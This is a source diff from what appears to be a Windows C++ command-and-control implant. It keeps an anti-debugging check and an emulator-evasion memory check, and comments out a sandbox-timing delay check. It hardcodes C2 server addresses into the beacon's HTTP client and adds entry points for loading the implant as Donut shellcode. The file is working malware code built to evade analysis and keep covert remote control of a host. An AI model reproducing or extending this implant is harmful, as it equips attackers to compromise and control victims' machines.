@@ -420,7 +420,9 @@ void BeaconMainPivot(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chr
 }
 void BeaconMainLoopPivot(shared_ptr<Beacon> beacon) {
     if (!beacon->BeaconInit()) {
+#ifdef DEBUG
         cout << "Error beaconInit returned: false" << endl;
+#endif
         return;
     }
     //auto nextCheckIn = std::chrono::system_clock::now() + std::chrono::nanoseconds(beacon->Duration());
@@ -502,27 +504,31 @@ void BeaconMainLoop(shared_ptr<Beacon> beacon) {
 //        }*/
 //    }
 //}
+
 int Entry() {
 #ifndef DEBUG
     PPEB pPEB = (PPEB)__readgsqword(0x60);
     if (pPEB->BeingDebugged) return 0;
 
-    FreeConsole();
+    //FreeConsole();
 
-    ULONGLONG uptimeBeforeSleep = GetTickCount64();
-    typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
-    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
-    LARGE_INTEGER delay;
-    PVOID m = NULL;
-    delay.QuadPart = -6000 * 100000; // 60 seconds
-    pNtDelayExecution(FALSE, &delay);
-    ULONGLONG uptimeAfterSleep = GetTickCount64();
-    if ((uptimeAfterSleep - uptimeBeforeSleep) < 60000) return false;
+    //ULONGLONG uptimeBeforeSleep = GetTickCount64();
+    //typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
+    //PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
+    //LARGE_INTEGER delay;
+    //PVOID m = NULL;
+    //delay.QuadPart = -6000 * 100000; // 60 seconds
+    //pNtDelayExecution(FALSE, &delay);
+    //ULONGLONG uptimeAfterSleep = GetTickCount64();
+    //if ((uptimeAfterSleep - uptimeBeforeSleep) < 60000) return false;
 
-    m = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
+    auto m = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
     if (m == NULL)
         return 0;
     VirtualFreeEx(GetCurrentProcess(), m, 0, MEM_RELEASE);
+#endif
+#ifdef DEBUG
+    printf("HELLO\n");
 #endif
 #ifdef  PIVOT
 #ifdef SMBPIVOT
@@ -549,7 +555,7 @@ int Entry() {
     unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "https://192.168.161.50" }, 10, 10, 10);
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
-    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "{{$value}}" }, 10, 10, 10);
+    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "https://192.168.161.50" }, 10, 10, 10);
     // {{end}} - range
 #endif
 #endif
@@ -557,10 +563,10 @@ int Entry() {
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
 #ifdef DEBUG
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("https://192.168.161.50", cli);
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("192.168.161.30:9005", cli);
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("{{$value}}", cli);
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("https://192.168.161.50", cli);
     // {{end}} - range
 #endif
     while (1) {
@@ -569,6 +575,15 @@ int Entry() {
         Sleep(std::chrono::duration_cast<std::chrono::milliseconds>(
             beacon->GetReconnectInterval()).count());
     }
+}
+
+VOID APIENTRY DonutApiVoid(VOID) {
+    Entry();
+}
+
+int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback) {
+    Entry();
+    return 0;
 }
 
 #ifdef EXE
